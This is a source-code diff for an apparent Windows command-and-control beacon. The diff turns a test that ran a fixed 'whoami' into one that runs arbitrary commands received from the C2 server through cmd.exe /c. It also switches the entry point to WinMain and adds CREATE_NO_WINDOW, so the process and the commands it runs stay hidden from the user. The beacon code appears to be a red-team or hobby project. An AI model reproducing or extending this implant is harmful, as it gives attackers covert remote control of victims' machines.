@@ -13,7 +13,8 @@ int beacon_to_c2(struct addrinfo* result, struct addrinfo* ptr, const char* send
 int send_message_to_c2(SOCKET ConnectSocket, const char* buffer);
 int execute_command(const char* cmd, SOCKET ConnectSocket);
 
-int main(int argc, char const* argv[]) 
+//int main(int argc, char const* argv[]) 
+int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
 {
 	WSADATA wsaData;
 
@@ -43,7 +44,7 @@ int main(int argc, char const* argv[])
 
 	ptr = result;
 
-	const char sendbuf[] = "this is a test\0";
+	const char sendbuf[] = "Hey, I'm the beacon! Pretty poggers if you ask me. Gimme command pls:\0";
 
 	/*iResult = shutdown(ConnectSocket, SD_SEND);
 	if (iResult == SOCKET_ERROR)
@@ -176,15 +177,10 @@ int execute_command(const char* cmd, SOCKET ConnectSocket)
 	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
 		return 1;
 
-	/*const char fCmd[32 + strlen(cmd)];
-	fCmd[0] = "C:\\Windows\\System32\\cmd.exe /k ";
-	TCHAR cmdLine[1024];
-	wcsncat_s(cmdLine, TEXT("C:\\Windows\\System32\\cmd.exe /k "), 1024);
-	wchar_t wCmd[996];
-	mbstowcs_s(NULL, wCmd, cmd, strlen(cmd) + 1);
-	wcsncat_s(cmdLine, wCmd, 1024);*/
-	printf("Running command: whoami\n");
-	TCHAR cmdLine[] = TEXT("C:\\Windows\\System32\\cmd.exe /c whoami");
+	size_t cmdBufLen = 32 + strlen(cmd);
+	std::string fCmd = "C:\\Windows\\System32\\cmd.exe /c ";
+	fCmd.append(cmd);
+	LPSTR aCmd = const_cast<char*>(fCmd.c_str());
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
 	BOOL bSuccess = FALSE;
@@ -198,16 +194,16 @@ int execute_command(const char* cmd, SOCKET ConnectSocket)
 	si.hStdInput = g_hChildStd_IN_Rd;
 	si.dwFlags |= STARTF_USESTDHANDLES;
 
-	bSuccess = CreateProcess(
+	bSuccess = CreateProcessA(
 		NULL,
-		cmdLine,
+		aCmd,
 		NULL,
 		NULL,
 		TRUE,
-		0,
+		CREATE_NO_WINDOW,
 		NULL,
 		NULL,
-		&si,
+		(LPSTARTUPINFOA)&si,
 		&pi
 	);
 
